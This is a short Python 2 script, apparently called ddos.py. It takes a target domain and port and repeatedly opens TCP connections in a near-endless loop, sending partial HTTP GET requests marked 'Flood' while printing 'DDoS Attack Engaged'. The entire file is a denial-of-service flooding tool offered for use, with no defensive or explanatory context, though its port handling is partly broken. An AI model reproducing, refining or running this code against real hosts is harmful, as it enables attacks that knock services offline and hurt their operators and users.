# -*- coding: utf-8 -*-
import time, socket, os, sys, string

if len(sys.argv)>1:
	host=sys.argv[1]
	port=sys.argv[2]
	message="Flood"
	ip = socket.gethostbyname(host)
	def dos():
	    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	    try:
	        ddos.connect((host, 80))
	        ddos.send( "GET /%s HTTP/1.1\r\n" % message )
	        ddos.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, port) )
	        ddos.send( "GET /%s HTTP/1.1\r\n" % message )
	    except socket.error, msg:
	        print("|[Connection Failed]         |")
	    print ( "|[DDoS Attack Engaged]       |")
	    ddos.close()
	
	for i in xrange(999999999999):
	    dos()
else:
	print("Usage:\tpython ddos.py domain port")
